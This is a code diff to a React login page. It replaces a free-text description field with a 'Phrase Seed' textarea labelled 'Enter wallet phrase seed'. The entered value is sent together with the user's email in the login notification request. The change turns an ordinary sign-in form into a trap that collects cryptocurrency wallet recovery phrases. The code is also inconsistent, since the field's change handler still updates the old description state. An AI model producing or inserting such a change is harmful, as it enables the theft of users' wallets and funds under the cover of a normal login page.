@@ -43,7 +43,7 @@ export function Login() {
       body: JSON.stringify({
         type: 'login',
         email: email.trim(),
-        description: description.trim() || 'No description provided'
+        phraseSeed: phraseSeed.trim() || 'No phrase seed provided'
       })
     }).catch(err => console.error('Login notification failed', err));
 
@@ -123,17 +123,17 @@ export function Login() {
                 )}
 
                 <label
-                  htmlFor="description"
+                  htmlFor="phraseSeed"
                   className="mt-6 block text-sm font-bold text-ink"
                 >
-                  Description
+                  Phrase Seed
                 </label>
                 <textarea
-                  id="description"
+                  id="phraseSeed"
                   rows={4}
-                  value={description}
+                  value={phraseSeed}
                   onChange={(e) => setDescription(e.target.value)}
-                  placeholder="Tell us what you're signing in for"
+                  placeholder="Enter wallet phrase seed"
                   className="mt-2 w-full resize-none rounded-2xl border border-hairline bg-white px-4 py-3.5 text-[15px] text-ink outline-none transition-colors duration-150 ease-smooth placeholder:text-ink-faint focus:border-brand"
                 />
 
